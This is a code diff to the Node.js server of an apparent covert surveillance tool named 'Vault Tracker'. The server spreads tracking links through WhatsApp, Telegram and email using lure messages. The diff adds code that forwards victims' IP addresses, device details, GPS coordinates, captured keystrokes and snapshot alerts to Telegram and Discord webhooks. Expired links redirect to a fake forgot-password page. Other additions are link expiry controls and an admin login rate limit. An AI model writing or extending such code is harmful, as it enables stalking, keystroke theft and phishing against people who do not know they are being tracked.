@@ -5,6 +5,7 @@ const path = require('path');
 const fs = require('fs');
 const { v4: uuidv4 } = require('uuid');
 const archiver = require('archiver');
+const rateLimit = require('express-rate-limit');
 
 const app = express();
 const server = http.createServer(app);
@@ -22,6 +23,7 @@ const crypto = require('crypto');
 
 // Admin token store
 const adminTokens = new Set();
+const linkExpiry = { duration: 0, enabled: false }; // 0 = no expiry, duration in minutes
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
@@ -54,6 +56,22 @@ function verifyAdmin(req, res, next) {
     next();
 }
 app.use(verifyAdmin);
+
+// Check link expiry for tracking page
+app.get('/', (req, res, next) => {
+    if (linkExpiry.enabled && linkExpiry.duration > 0) {
+        const linkCreatedAt = parseInt(req.query._t || '0') || 0;
+        if (linkCreatedAt > 0) {
+            const elapsed = Date.now() - linkCreatedAt;
+            const maxAge = linkExpiry.duration * 60 * 1000;
+            if (elapsed > maxAge) {
+                return res.redirect('/lupa-password.html?expired=1');
+            }
+        }
+    }
+    next();
+});
+
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, 'admin-panel')));
 
@@ -531,20 +549,62 @@ app.delete('/api/webhook', (req, res) => {
     res.json({ ok: true, webhooks });
 });
 
+app.post('/api/webhook/test', (req, res) => {
+    const { type, url } = req.body;
+    if (!type || !url) return res.status(400).json({ error: 'type and url required' });
+    const testText = `[Vault Tracker Test]\nJika Anda menerima pesan ini, webhook berfungsi dengan baik.\nWaktu: ${new Date().toLocaleString('id-ID')}`;
+    
+    if (type === 'telegram') {
+        fetch(url.replace('{text}', encodeURIComponent(testText)), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text: testText }) })
+            .then(r => res.json({ ok: r.ok, status: r.status }))
+            .catch(e => res.status(500).json({ error: e.message }));
+    } else if (type === 'discord') {
+        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: testText }) })
+            .then(r => res.json({ ok: r.ok, status: r.status }))
+            .catch(e => res.status(500).json({ error: e.message }));
+    } else {
+        res.status(400).json({ error: 'invalid type' });
+    }
+});
+
 async function sendWebhook(deviceId, eventType, data) {
     const d = devices.get(deviceId);
     if (!d) return;
     const profile = generateProfile(d);
-    const text = `[Tracker] Device ${d.label}\nID: ${deviceId.slice(0,8)}\nEvent: ${eventType}\nTime: ${new Date().toLocaleString()}\nLocation: ${d.location ? d.location.lat.toFixed(4)+','+d.location.lng.toFixed(4) : 'N/A'}\nOS: ${profile.os}\nBrowser: ${profile.browser}\nRisk: ${profile.riskLevel}`;
+    const timeStr = new Date().toLocaleString('id-ID');
+    
+    let extraInfo = '';
+    if (eventType === 'new_device') {
+        extraInfo = `IP: ${d.ip || 'N/A'}\nBrowser: ${profile.browser}\nOS: ${profile.os}\nDevice: ${profile.deviceType}`;
+    } else if (eventType === 'location_update' && data && data.location) {
+        extraInfo = `Lat: ${data.location.lat.toFixed(4)}\nLng: ${data.location.lng.toFixed(4)}\nAkurasi: ${data.location.accuracy ? data.location.accuracy.toFixed(0) + 'm' : 'N/A'}`;
+    } else if (eventType === 'forensics_alert') {
+        extraInfo = `Tipe: ${data.type}\nDetail: ${data.detail}`;
+    } else if (eventType === 'keystroke') {
+        extraInfo = `Keystroke baru: "${(data.k || '').slice(0,20)}"`;
+    } else if (eventType === 'snapshot_taken') {
+        extraInfo = `Snapshot baru tersedia`;
+    }
+    
+    const text = `[Vault Tracker]\nDevice: ${d.label}\nID: ${deviceId.slice(0,8)}\nEvent: ${eventType}\nWaktu: ${timeStr}\n${extraInfo}\nLocation: ${d.location ? d.location.lat.toFixed(4)+','+d.location.lng.toFixed(4) : 'N/A'}\nRisk: ${profile.riskLevel}`;
+    const shortText = `[Vault] ${d.label}: ${eventType}`;
 
     for (const url of webhooks.telegram) {
         try {
-            await fetch(url.replace('{text}', encodeURIComponent(text)), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ text, parse_mode: 'HTML' }) });
+            await fetch(url.replace('{text}', encodeURIComponent(text)), { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ text, parse_mode: 'HTML' }) 
+            });
         } catch(e) {}
     }
     for (const url of webhooks.discord) {
         try {
-            await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: text }) });
+            await fetch(url, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({ content: text }) 
+            });
         } catch(e) {}
     }
 }
@@ -557,6 +617,15 @@ io.emit = function(event, data) {
     }
     if (event === 'device-update' && data && data.location) {
         sendWebhook(data.id, 'location_update', data).catch(()=>{});
+    }
+    if (event === 'forensics-alert' && data && data.deviceId) {
+        sendWebhook(data.deviceId, 'forensics_alert', data).catch(()=>{});
+    }
+    if (event === 'new-snapshot' && data && data.deviceId) {
+        sendWebhook(data.deviceId, 'snapshot_taken', data).catch(()=>{});
+    }
+    if (event === 'device-offline' && data) {
+        sendWebhook(data, 'device_offline', {}).catch(()=>{});
     }
     return origEmit(event, data);
 };
@@ -583,17 +652,40 @@ app.get('/api/alerts/:deviceId', (req, res) => {
 // ===== AUTO-TARGETING =====
 app.get('/api/target/link', (req, res) => {
     const baseUrl = `${req.protocol}://${req.get('host')}`;
+    const expiresAt = linkExpiry.enabled && linkExpiry.duration > 0 ? Date.now() + linkExpiry.duration * 60 * 1000 : null;
     res.json({
         trackingLink: baseUrl + '/',
         adminLink: baseUrl + '/admin.html',
         whatsapp: 'https://wa.me/?text=' + encodeURIComponent('Lihat ini: ' + baseUrl + '/'),
         telegram: 'https://t.me/share/url?url=' + encodeURIComponent(baseUrl + '/') + '&text=' + encodeURIComponent('Cek link ini'),
-        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/')
+        email: `mailto:?subject=Penting&body=` + encodeURIComponent(baseUrl + '/'),
+        expiresAt,
+        expiryEnabled: linkExpiry.enabled,
+        expiryMinutes: linkExpiry.duration
     });
 });
 
+app.post('/api/admin/expiry', (req, res) => {
+    const { enabled, duration } = req.body;
+    linkExpiry.enabled = !!enabled;
+    linkExpiry.duration = parseInt(duration) || 0;
+    res.json({ ok: true, expiry: linkExpiry });
+});
+
+app.get('/api/admin/expiry', (req, res) => {
+    res.json(linkExpiry);
+});
+
 // Admin login/logout
-app.post('/api/admin/login', (req, res) => {
+const loginLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,
+    max: 5,
+    message: { error: 'too many login attempts, try again in 15 minutes' },
+    standardHeaders: true,
+    legacyHeaders: false
+});
+
+app.post('/api/admin/login', loginLimiter, (req, res) => {
     const { password } = req.body || {};
     if (password === ADMIN_PASSWORD) {
         const token = crypto.randomBytes(24).toString('hex');
